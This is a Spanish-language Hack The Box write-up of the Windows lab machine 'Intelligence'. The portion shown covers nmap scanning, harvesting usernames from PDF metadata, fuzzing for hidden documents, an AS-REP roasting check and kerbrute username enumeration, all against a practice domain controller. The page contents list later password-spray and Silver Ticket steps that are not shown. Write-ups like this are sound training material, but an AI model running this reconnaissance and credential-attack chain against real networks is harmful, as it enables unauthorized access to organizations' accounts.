<!doctype html><html lang="es"><head><title>Intelligence | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta itemprop="description" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta name="twitter:card" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta name="twitter:description" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta property="og:description" content="Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Intelligence/Intelligence.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Intelligence"><meta property="twitter:title" content="Intelligence"><meta property="og:title" content="Intelligence"><meta property="og:url" content="https://7rocky.github.io/htb/intelligence/"><meta itemprop="keywords" content="dns,smb,bloodhound,password-spray,active-directory,metadata,silver-ticket-attack,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/intelligence/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/intelligence/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/intelligence/&text=Intelligence" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/intelligence/&title=Intelligence" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Intelligence</h1><time class="mt4 f6 dib tracked" datetime="2021-11-27T00:00:00+01:00">27 / 11 / 2021</time><br><p class="mb4 f6 dib tracked">13 minutos de lectura</p></header><div class="htb-image"><img alt="Intelligence" src="/images/HTB/Intelligence/Intelligence.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/dns" title="DNS">DNS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/smb" title="SMB">SMB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/bloodhound" title="BloodHound">BloodHound</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-spray" title="Password spray">Password spray</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/active-directory" title="Active Directory">Active Directory</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/metadata" title="Metadatos de archivos">Metadatos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/silver-ticket-attack" title="Ataque de Silver Ticket">Ataque de Silver Ticket</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#encontrando-nombres-de-usuario-en-metadatos-de-archivos">Encontrando nombres de usuario en metadatos de archivos</a></li><li><a href="#encontrando-más-archivos-y-nombres-de-usuario">Encontrando más archivos y nombres de usuario</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#obtención-de-credenciales-válidas">Obtención de credenciales válidas</a></li><li><a href="#enumeración-por-smb">Enumeración por SMB</a></li></ul></li><li><a href="#movimiento-lateral">Movimiento lateral</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#ataque-de-_silver-ticket_">Ataque de <em>Silver Ticket</em></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Windows</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.10.248</li><li><strong>Fecha</strong>: 03 / 07 / 2021</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49229,49667,49691,49692,49704,49713  
Nmap scan report for 10.10.10.248
Host is up (0.36s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: )
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49229/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49704/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date:
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h15m31s, deviation: 0s, median: 7h15m30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 103.53 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) y 5985 (WinRM), entre otros.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> smb 10.10.10.248
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-blue">[*]</span> Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)  
</code></pre></div><p>Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo <code>intelligence.htb</code> en <code>/etc/hosts</code>.</p><h2 id="enumeración">Enumeración</h2><p>Si entramos en <code>http://10.10.10.248</code>, veremos una página web como la siguiente:</p><p><img src="/images/HTB/Intelligence/Intelligence-web.png" alt="Intelligence web"></p><p>Bajando un poco, podremos descargar dos documentos PDF con dos enlaces:</p><p><img src="/images/HTB/Intelligence/Intelligence-pdf.png" alt="Intelligence PDF downloads"></p><p>También podemos copiar los enlaces y utilizar <code>wget</code> desde la consola de comandos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q http://10.10.10.248/documents/2020-01-01-upload.pdf  

<span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q http://10.10.10.248/documents/2020-12-15-upload.pdf
</code></pre></div><h3 id="encontrando-nombres-de-usuario-en-metadatos-de-archivos">Encontrando nombres de usuario en metadatos de archivos</h3><p>Teniendo en cuenta que estamos intentando comprometer un entorno de Active Directory, necesitamos buscar nombres de usuario y credenciales (a lo mejor <em>hashes</em> NTLM o <em>tickets</em> de Kerberos).</p><p>El contenido de los documentos PDF es un simple texto <em>Lorem ipsum</em>, nada relevante.</p><p>Sin embargo, estos archivo PDF tienen metadatos. Entre estos metadatos, podemos encontrar dos nombres de usuario. Para extraer los metadatos podemos utilizar <code>exiftool</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exiftool</span> <span class="code-dark-blue">*</span>.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number         : 12.30
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00  
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number         : 12.30
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
</code></pre></div><p>Y ahora tenemos dos nombres de usuario potenciales. Veamos si alguno de ellos es &ldquo;AS-REP Roasteable&rdquo;:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">impacket-GetNPUsers</span> -usersfile <span class="mtku">users.txt</span> -dc-ip 10.10.10.248 -no-pass intelligence.htb/  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
</code></pre></div><p>Y vemos que no lo son. Veamos si por lo menos son usuarios válidos a nivel de dominio con <a href="https://github.com/ropnop/kerbrute"><code>kerbrute</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./kerbrute</span> userenum --dc 10.10.10.248 -d intelligence.htb <span class="mtku">users.txt</span>  

&gt;  Using KDC(s):
&gt;   10.10.10.248:88

<span class="code-dark-green">&gt;  [+] VALID USERNAME:       William.Lee@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jose.Williams@intelligence.htb</span>
&gt;  Done! Tested 2 usernames (2 valid) in 0.123 seconds
</code></pre></div><p>Y sí lo son, pero hemos llegado a un callejón sin salida.</p><h3 id="encontrando-más-archivos-y-nombres-de-usuario">Encontrando más archivos y nombres de usuario</h3><p>Mirando el nombre de los archivos (<code>2020-01-01-upload.pdf</code> y <code>2020-12-15-upload.pdf</code>), podemos deducir que a lo mejor existen más archivos almacenados en el servidor con el mismo formato (es decir, <code>YYYY-MM-DD-upload.pdf</code>).</p><p>Para probar todas las posibilidades en el año 2020 se puede programar un <em>script</em> en Go llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence/reqPdf.go"><code>reqPdf.go</code></a>, que realizará todas las peticiones y descargará los archivos encontrados en menos de un segundo (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Intelligence#reqPdfgo">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">reqPdf.go</span>
Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf  
Found 84 files in 784.6615ms
</code></pre></div><p>Como se puede ver, se han descargado 84 archivos (realmente, solo 82 son archivos nuevos). Ahora, podemos extraer los metadatos con <code>exiftool</code> al igual que antes. Esta vez, podemos utilizar un poco de <em>shell scripting</em> para filtrar los nombres de usuario y almacenarlos en un archivo evitando repeticiones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exiftool</span> <span class="code-dark-blue">*</span>.pdf | <span class="code-dark-green">grep</span> Creator | <span class="code-dark-green">awk</span> <span class="code-dark-yellow">'{ print $3 }'</span> | <span class="code-dark-green">sort</span> -u | <span class="code-dark-green">tee</span> users.txt  
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
</code></pre></div><p>Veamos si los nombres de usuario son válidos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./kerbrute</span> userenum --dc 10.10.10.248 -d intelligence.htb <span class="mtku">users.txt</span>  

&gt;  Using KDC(s):
&gt;   10.10.10.248:88

<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Brian.Morris@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       David.Mcbride@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       David.Wilson@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       David.Reed@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Brian.Baker@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       John.Coleman@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jason.Wright@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Jose.Williams@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Richard.Williams@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Kelly.Long@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Scott.Scott@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Travis.Evans@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb</span>
